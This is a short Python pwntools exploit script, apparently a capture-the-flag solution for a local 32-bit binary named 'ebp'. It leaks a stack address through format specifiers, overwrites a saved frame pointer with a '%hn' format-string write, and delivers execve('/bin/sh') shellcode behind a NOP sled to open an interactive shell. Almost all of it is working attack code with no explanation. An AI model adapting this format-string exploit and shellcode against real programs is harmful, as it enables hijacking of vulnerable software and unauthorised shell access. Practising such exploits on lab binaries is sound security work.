from pwn import *
import time,sys,binascii

elf_name = "./ebp"
elf = ELF(elf_name)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

io = process( elf_name )
gdb.attach(io, "b *0x08048574")
'''
shellcode = "\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f" \
                "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0" \
                "\x0b\xcd\x80"
'''
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x59\x50\x5a\xb0\x0b\xcd\x80\n"
def main():
    '''
    format1 = '%4$p\n'
    '''
    format1="%x%x%x%x"

    io.sendline(format1)
    echo_ebp = io.recv()
    print echo_ebp,len(echo_ebp)
    echo_ebp=echo_ebp[-6:-2]
    echo_ebp = int(echo_ebp, 16)
    print 'echo_ebp is', hex(echo_ebp)
    make_response_ebp = echo_ebp -0x20
    main_ebp = echo_ebp + 0x20
    print 'make_response_ebp is', hex(make_response_ebp)
    print 'main_ebp is', hex(main_ebp)

    format2 = "%%%dc" % make_response_ebp + "%4$hn\n"
    io.send(format2)
    print io.recv()

    format3 = "\x90\x90\xeb\x0f" + "%%%dc" %(echo_ebp + 4 -4) + "%12$hn" +"\x90"*10 + shellcode + "\n"

    io.send(format3)
    print io.recv()

    io.interactive()


if __name__ == '__main__':
    main()
